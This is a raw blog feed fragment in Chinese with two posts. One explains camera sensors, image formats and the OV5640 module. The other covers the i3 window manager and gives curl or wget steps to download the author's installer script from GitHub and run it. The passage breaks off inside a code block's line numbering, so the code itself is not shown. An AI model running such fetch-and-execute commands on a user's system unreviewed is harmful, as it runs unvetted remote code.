    <link href="/2024/03/07/%E6%91%84%E5%83%8F%E5%A4%B4%E6%A8%A1%E5%9D%97/"/>
    <url>/2024/03/07/%E6%91%84%E5%83%8F%E5%A4%B4%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="图像传感器的种类"><a href="#图像传感器的种类" class="headerlink" title="图像传感器的种类"></a>图像传感器的种类</h2><p>摄像头的图像传感器CCD与CMOS传感器主要区别如下：</p><h3 id="成像材料"><a href="#成像材料" class="headerlink" title="成像材料"></a>成像材料</h3><p>CCD与CMOS的名称跟它们成像使用的材料有关，CCD是“电荷耦合器件”(Charge Coupled Device)的简称， 而CMOS是“互补金属氧化物半导体”(Complementary Metal Oxide Semiconductor)的简称。</p><h3 id="功耗"><a href="#功耗" class="headerlink" title="功耗"></a>功耗</h3><p>由于CCD的像素由MOS电容构成，读取电荷信号时需使用电压相当大(至少12V)的二相或三相或四相时序脉冲信号，才能有效地传输电荷。 因此CCD的取像系统除了要有多个电源外，其外设电路也会消耗相当大的功率。有的CCD取像系统需消耗2<del>5W的功率。 而CMOS光电传感器件只需使用一个单电源5V或3V，耗电量非常小，仅为CCD的1&#x2F;8</del>1&#x2F;10，有的CMOS取像系统只消耗20~50mW的功率。</p><h3 id="成像质量"><a href="#成像质量" class="headerlink" title="成像质量"></a>成像质量</h3><p>CCD传感器件制作技术起步早，技术成熟，采用PN结或二氧化硅(sio2)隔离层隔离噪声，所以噪声低，成像质量好。与CCD相比， CMOS的主要缺点是噪声高及灵敏度低，不过现在随着CMOS电路消噪技术的不断发展，为生产高密度优质的CMOS传感器件提供了良好的条件， 现在的CMOS传感器已经占领了大部分的市场，主流的单反相机、智能手机都已普遍采用CMOS传感器。</p><h2 id="摄像头的种类"><a href="#摄像头的种类" class="headerlink" title="摄像头的种类"></a>摄像头的种类</h2><p>根据输出信号的类型、接口类型、分辨率可以对摄像头进行分类。</p><h3 id="输出信号类型"><a href="#输出信号类型" class="headerlink" title="输出信号类型"></a>输出信号类型</h3><p>数字摄像头输出信号为数字信号，模拟摄像头输出信号为标准的模拟信号。</p><h3 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h3><p>数字摄像头有USB接口(比如常见的PC端免驱摄像头)、IEE1394火线接口(由苹果公司领导的开发联盟开发的一种高速度传送接口， 数据传输率高达800Mbps)、千兆网接口（网络摄像头）。模拟摄像头多采用AV视频端子（信号线+地线）或S-VIDEO（即莲花头–SUPER VIDEO， 是一种五芯的接口，由两路视频亮度信号、两路视频色度信号和一路公共屏蔽地线共五条芯线组成）。</p><h3 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h3><p>模拟摄像头的感光器件，其像素指标一般维持在752(H)*582(V)左右的水平，像素数一般情况下维持在41万左右。 现在的数字摄像头分辨率一般从数十万到数千万。但这并不能说明数字摄像头的成像分辨率就比模拟摄像头的高， 原因在于模拟摄像头输出的是模拟视频信号，一般直接输入至电视或监视器，其感光器件的分辨率与电视信号的扫描数呈一定的换算关系， 图像的显示介质已经确定，因此模拟摄像头的感光器件分辨率不是不能做高，而是依据于实际情况没必要做这么高。</p><h2 id="图像-视频的格式"><a href="#图像-视频的格式" class="headerlink" title="图像&amp;视频的格式"></a>图像&amp;视频的格式</h2><p>图像输出的主要格式有：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403071651417.png"></p><ul><li><p>RGB 格式:采用这种编码方法,每种颜色都可用三个变量来表示红色、绿色以及蓝色的强度。每一个像素有三原色 R 红色、G 绿色、B 蓝色组成。RGB 常用的数据格式有 RGB888，RGB565，RGB555 这几种。这个格式和<code>RGB raw</code>格式是不同的。</p><p>  RGB565，其16-bit数据格式为5-bit R + 6-bit G + 5-bit B。G多一位，原因是人眼对绿色比较敏感。</p><p>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403071707780.png"></p><p>  其中<code>A</code>表示的是<strong>透明</strong>。</p></li><li><p>RAW RGB格式:是 CCD 或 CMOS 在将光信号转换为电信号时的电平高低的原始记录,单纯地将没有进行任何处理的图像数据,即摄像元件直接得到的电信号进行数字化处理而得到的。这个格式的每个像素点只有一种颜色，而<code>RBG</code>每个像素点有三种颜色，每个值都在<code>0-255</code>之间。</p></li><li><p>YUV 格式:其中“Y”表示明亮度(Luminance 或 Luma),就是灰阶值;而“U”和“V”表示色度(Chrominance 或 Chroma),是描述影像色彩及饱和度,用于指定像素的颜色。这个格式由于其会保留最原始的数据信息，所以其所占的空间比较大，并且其进行后期优化修改的可造性也比其他格式好。所以这个格式对于专业的摄影师来说是常用的。<strong>这个格式需要使用特殊的软件才可以打卡</strong></p><ul><li>分类方式根据采样的不同，分为 YUV444，YUV422，YUV420。<ul><li>YUV444：每个像素点同时包含 Y&#x2F;U&#x2F;V 3个参数。</li><li>YUV422：每2个像素点共享一组 U&#x2F;V 参数，同时每个像素拥有自己的 Y 参数。</li><li>YUV420：每4个像素点共享一组 U&#x2F;V 参数，同时每个像素拥有自己的 Y 参数。</li></ul></li></ul></li></ul><h2 id="RGB格式和YUV格式"><a href="#RGB格式和YUV格式" class="headerlink" title="RGB格式和YUV格式"></a>RGB格式和YUV格式</h2><p>sensor（传感器）输出的数据格式，主要分两种：YUV（比较流行），RGB，这就是sonsor的数据输出；这其中的GRB就是Raw RGB，是sensor的bayer阵列获取的数据（每种传感器获得对应的颜色亮度）；</p><p>但是输出的数据不等于就是图像的实际数据，模组测试时，就要写一个软件，完成数据采集（获得Raw data）－&gt;彩色插值（目的是获得RGB格式，便于图像显示）－&gt;图像显示；</p><p>支持 YUV&#x2F;RGB 格式的模组,一般会在模组上集成 ISP(Image Single Processor),经过A&#x2F;D 转换过的原始数据经过 ISP 处理生成 YUV 标准格式传到 BB。一般来说,这种设计适用于低像素 Camera 的要求,会在主板上省去一个 DSP,可降低成本。在调试过程中,YUV&#x2F;RGB 格式的摄像头,其所有参数都可在 kernel 层通过寄存器来控制。调试一般由 sensor的原厂支持。</p><p>支持 RawData 格式的模组,由于感光区域的需求,不会再模组内集成 ISP 以最大程度的增大感光区域的面积,提高照片质量。模组把原始的数字信号传给 BB 上的 DSP 进行处理,MTK 自带的 DSP 一般包含 ISP、JPEG encoder、和 DSP 控制芯片。在调试的时候图像的效果需要 MTK 在 HAL 层的参数进行支持。</p><ul><li><p>JPEG: 如果将图像原始格式直接存储到文件中将会非常大，比如一个5000<em>5000 24位图，所占文件大小为5000</em>5000*3字节&#x3D;71.5MB, 其大小非常可观。如果用zip或rar之类的通用算法来压缩像素数据，得到的压缩比例通常不会太高，因为这些压缩算法没有针对图像数据结构进行特殊处理。</p><p>  于是就有了jpeg,png等格式，同样是图像压缩算法jpeg和png也有不同的适用场景。<code>JPEG</code>也称之为<code>JPG</code>。有些sensor（传感器），特别是低分辨率的，其自带<code>JPEG engine</code>，可以直接输出压缩后的jpg格式的数据，jpg全名是JPEG。JPEG 是与平台无关的格式，支持最高级别的压缩（这种压缩是有损耗的）, 将像素信息用JPEG保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在<code>[-1,100]</code>之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择70或80就足够了。JPEG没有透明信息。jpeg比较适合用来存储相机拍出来的照片，这类图像用JPEG压缩后的体积比较小。</p><ul><li><p>其使用的具体算法核心是离散余弦变换、Huffman编码、算术编码等技术。</p></li><li><p>jpeg格式支持不完全读取整张图片，即可以选择读取原图、1&#x2F;2、1&#x2F;4、1&#x2F;8大小的图片</p></li><li><p>jpeg没有透明信息。</p></li><li><p><strong>jpeg比较适合用来存储相机拍出来的照片，这类图像用jpeg压缩后的体积比较小。</strong></p></li></ul></li><li><p>PNG格式，这个格式是无损压缩的。<strong>png可以有透明效果。</strong>。<strong>png比较适合适量图,几何图。 比如本文中出现的这些图都是用png保存，比用joeg保存体积要小。</strong></p></li></ul><h2 id="jpeg格式和png格式的异同"><a href="#jpeg格式和png格式的异同" class="headerlink" title="jpeg格式和png格式的异同"></a>jpeg格式和png格式的异同</h2><ul><li>jpeg比较适合存储色彩“杂乱”的拍摄图片，png比较适合存储几何特征强的图形类图片。</li><li><strong>jpeg,png文件之于图像，就相当于zip,rar格式之于普通文件(用zip,rar格式对普通文件进行压缩)。</strong></li><li>jpeg没有透明信息。而png有。</li></ul><p>视频的输出数据</p><h1 id="OV5640模块"><a href="#OV5640模块" class="headerlink" title="OV5640模块"></a>OV5640模块</h1><p>由于我在项目中使用的是微雪的OV5640模块，所以对其进行主要的介绍、总结。</p><p>这个模块使用的是OV5640的图像传感器。下面我们主要介绍这个ov公司的传感器芯片。</p><h2 id="OV5640传感器"><a href="#OV5640传感器" class="headerlink" title="OV5640传感器"></a>OV5640传感器</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403071730339.png"></p><p>上图是该传感器的引脚定义，每个引脚的作用如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403072321039.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/haiping1224746757/article/details/105976765">Camera常见输出格式简介</a></p><p><a href="https://www.nxrte.com/jishu/3320.html">相机的常见输出格式</a></p><p><a href="https://doc.embedfire.com/mcu/stm32/f407batianhu/std/zh/latest/book/DCMI_OV5640.html">野火官方教程</a></p><p><a href="https://www.cnblogs.com/yuluoxingkong/p/10681253.html">https://www.cnblogs.com/yuluoxingkong/p/10681253.html</a></p><p><a href="https://blog.csdn.net/qq_40642828/article/details/130912514">RAW、RGB 、YUV三种图像格式理解</a></p><p><a href="https://blog.csdn.net/gg13213/article/details/123855050">图像处理格式</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>i3自动安装</title>
    <link href="/2024/03/03/i3%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85/"/>
    <url>/2024/03/03/i3%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>自动配置i3的程序</p><span id="more"></span><h1 id="什么是i3"><a href="#什么是i3" class="headerlink" title="什么是i3"></a>什么是i3</h1><p>i3-wm 是一种动态的平铺式窗口管理器，它的设计目标是提供一个快速、简洁、可定制的桌面环境，适合开发者和高级用户使用。它有以下几个特点：</p><p>它使用树形结构来管理窗口，可以灵活地分割、组合、切换窗口。<br>它支持多种操作模式，类似于 vim，可以通过快捷键执行各种命令。<br>它支持多显示器，可以在不同的输出设备上创建和移动工作区。<br>它有丰富的生态系统，可以与其他桌面环境集成，或者使用第三方的工具来增强 i3-wm 的外观和体验。<br>i3-wm 可以在多数 Linux 发行版中安装，通常包名为 i3-wm 或 i3 的名称。安装后，可以通过 tty 或显示管理器来启动 i3-wm 环境。</p><p>说明一下在 i3 中经常遇到的 i3-wm 和 i3-gaps 含义：</p><p>i3-wm 是 i3 窗口管理器的官方名称，它是一个轻量级、快速且高度可定制的窗口管理器。”wm” 代表窗口管理器（Window Manager），这是它的主要功能。i3-wm使用平铺式窗口管理，意味着窗口默认以平铺的方式在屏幕上排列，不重叠。用户可以使用键盘快捷键来进行窗口的切换、移动和调整大小等操作，而不需要使用鼠标。</p><p>i3-gaps 是 i3 窗口管理器的一个分支，它在 i3-wm 的基础上增加了一个有趣的功能：窗口间的间隙。这意味着在 i3-gaps 中，窗口之间可以留有一些空隙，使得用户可以更好地区分窗口。这是 i3-gaps 与 i3-wm 之间的主要区别。在 i3-wm 中，窗口紧密排列，没有间隙；而在 i3-gaps 中，你可以通过配置增加窗口之间的间隙。这使得 i3-gaps 更受一些用户喜爱，尤其是那些喜欢自定义和视觉效果的用户。<br>相信你在网络上看到的说明大多数是这样，说点不一样的新消息：i3-gaps 被合并了</p><h1 id="图形用户界面（GUI）"><a href="#图形用户界面（GUI）" class="headerlink" title="图形用户界面（GUI）"></a>图形用户界面（GUI）</h1><p>图形用户界面（GUI）中的三个概念：桌面环境（DE）、窗口管理器（WM）、显示管理器（DM）</p><p>桌面环境（DE）：</p><p>桌面环境是最上层的图形用户界面，为用户提供了一个集成的、直观的桌面体验。DE通常包含窗口管理器、文件管理器、面板、系统托盘、启动器、图标、主题、壁纸等元素，以及一系列预装的应用程序，如文本编辑器、终端仿真器、邮件客户端等。流行的桌面环境包括 GNOME、KDE Plasma、XFCE、Cinnamon 等。桌面环境为用户提供了一个全面的、易于使用的界面，适用于不同水平的用户。</p><p>窗口管理器（WM）：</p><p>窗口管理器是桌面环境的一个组成部分，负责管理图形界面中各个窗口的显示、移动、调整大小和关闭等操作。它负责处理窗口的外观、布局和交互，使用户可以通过鼠标和键盘与窗口进行交互。窗口管理器通常提供窗口标题栏、边框和控制按钮（最小化、最大化、关闭等），同时还支持窗口的层叠、平铺和堆叠等布局方式。一些流行的窗口管理器包括 Metacity、KWin、Openbox、i3 等。</p><p>显示管理器（DM）：</p><p>显示管理器是启动时出现的登录界面，它提供了一个用户登录到图形桌面环境的方式。当计算机启动时，显示管理器负责呈现一个登录屏幕，用户可以在该屏幕上输入用户名和密码，选择桌面环境，然后会话将启动并加载相应的桌面环境。显示管理器简化了用户登录过程，同时还支持多个用户账号。常见的显示管理器包括 GDM（GNOME Display Manager）、LightDM、SDDM（Simple Desktop Display Manager）等。</p><p>三者关系：</p><p>WM 是 DE 的一部分，负责处理窗口的布局、外观和交互。<br>DM 是用户登录到桌面环境的入口。它出现在计算机启动时，用户选择桌面环境后，DM 会加载相应的 DE 和 WM 相关程序。<br>重点：实际上非常奇妙的操作，我们可以在根本不需要 GNOME、KDE Plasma、XFCE 桌面环境下直接骚操作使用 i3-wm 窗口管理器</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>今天分享一下个人的I3wm桌面，初步配置情况已经实现脚本化配置，并且实现了自动适配分辨率(4K&#x2F;2K&#x2F;1080p)屏幕，减少了很多重复配置的无效工作。</p><h1 id="切换i3wm桌面"><a href="#切换i3wm桌面" class="headerlink" title="切换i3wm桌面"></a>切换i3wm桌面</h1><p>切换到I3窗口管理器分两种情况：</p><p>初始系统无X窗口系统： 即之前没有安装过任何桌面环境，这种就是从零开始安装X窗口系统。<br>基于现有桌面环境切换为I3窗口管理器： 省去安装X窗口系统的前提，直接安装i3wm窗口管理器然后配置即可。<br>让我们比较一下这两种情况切换到 i3 窗口管理器的优缺点。</p><ol><li>初始系统无X窗口系统：</li></ol><p>优点：<br>最干净的安装：从零开始安装 X 窗口系统，没有任何额外的桌面环境或软件包。<br>资源利用率低：因为没有其他桌面环境，只安装了最少的必要组件，所以系统资源利用率较低。<br>自定义性高：从零开始，可以完全根据个人喜好和需求进行定制。<br>缺点：<br>学习曲线较陡：对于没有经验的用户来说，从零开始安装 X 窗口系统并配置 i3 可能会有一定的学习曲线。<br>配置工作量较大：因为从零开始，你需要手动安装和配置 X 窗口系统以及其他必要的组件。<br>2. 基于现有桌面环境切换为 i3 窗口管理器：</p><p>优点：<br>简化安装过程：不需要安装整个 X 窗口系统，可以直接安装 i3 窗口管理器。<br>利用现有环境：可以利用已经安装的桌面环境的设置和依赖项，减少配置工作量。<br>逐步过渡：可以先尝试 i3 窗口管理器，逐步习惯并切换到全面使用。<br><br><br>缺点：<br>可能存在冲突：如果现有的桌面环境和 i3 窗口管理器之间有冲突，可能需要解决冲突或调整设置。<br>可能存在额外资源占用：由于现有桌面环境的存在，可能会占用额外的系统资源。<br>综上，初始系统无 X 窗口系统的方法更适合那些希望从零开始、完全自定义和精简系统的用户。虽然有一些学习和配置的成本，但可以获得最大的灵活性。另一方面，基于现有桌面环境切换为 i3 窗口管理器的方法更适合那些想要简化安装过程并逐步过渡到 i3 的用户。它可以利用现有环境，并且相对较少的配置工作。选择哪种方法取决于个人的偏好、时间和技术水平。</p><h1 id="开始安装i3窗口管理器"><a href="#开始安装i3窗口管理器" class="headerlink" title="开始安装i3窗口管理器"></a>开始安装i3窗口管理器</h1><p>经过一段时间的学习，基本掌握的大部分的i3wm配置规则，同时也编写了一个i3config脚本工具帮助自动化配置i3桌面环境，这样可以省去了非常多的手工配置时间。接下来，我们来看下如何使用i3config工具吧。</p><p>首先，获取下载i3config脚本命令:</p><h1 id="使用-curl-或者-wget-命令快速下载-i3config命令"><a href="#使用-curl-或者-wget-命令快速下载-i3config命令" class="headerlink" title="使用 curl 或者 wget 命令快速下载 i3config命令"></a>使用 curl 或者 wget 命令快速下载 i3config命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zsh">curl -L -o i3config https://raw.githubusercontent.com/switchToLinux/dotfiles/main/i3config<br><br>wget -O i3config https://raw.githubusercontent.com/switchToLinux/dotfiles/main/i3config<br><br>chmod +x i3config<br>./i3config<br></code></pre></td></tr></table></figure><p>第二步，安装i3wm桌面环境，根据菜单选择z自动化安装，自动化从源码编译安装一系列的软件，同时会自动配置好桌面环境。</p><p>第三步，安装完成，做一次重启系统，不出意外的话就可以进入登录界面。</p><p>目前，此脚本在openSUSE&#x2F;debian&#x2F;ubuntu&#x2F;fedora38上测试通过，更多功能还在开发中。</p><h1 id="自动下载文件"><a href="#自动下载文件" class="headerlink" title="自动下载文件"></a>自动下载文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span 